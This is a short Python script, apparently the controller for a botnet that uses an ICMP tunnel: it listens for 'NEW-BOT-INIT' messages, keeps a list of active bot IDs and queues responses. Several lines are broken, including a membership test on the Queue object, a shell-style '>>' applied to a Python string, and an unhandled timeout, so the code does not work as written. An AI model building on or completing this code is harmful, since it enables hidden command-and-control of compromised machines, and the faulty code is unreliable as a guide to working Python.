from icmp_tunnel import *
import Queue

botsQueue = Queue.Queue()
responseQueue = Queue.Queue()
activeBots = []
botsfile = "activebots"
def main():
	listener = Listener(botsQueue)
	listener.start()
	
	while True:
		traffic = botsQueue.get(True, 5)
		if "NEW-BOT-INIT" in botsQueue:
			activeBots.append(traffic.split(":")[1])
			traffic.split(":")[1] >> botsfile
			for bot in activeBots:
				print(">>"+bot+"<<")
		else:
			responseQueue.put(traffic)


main()					
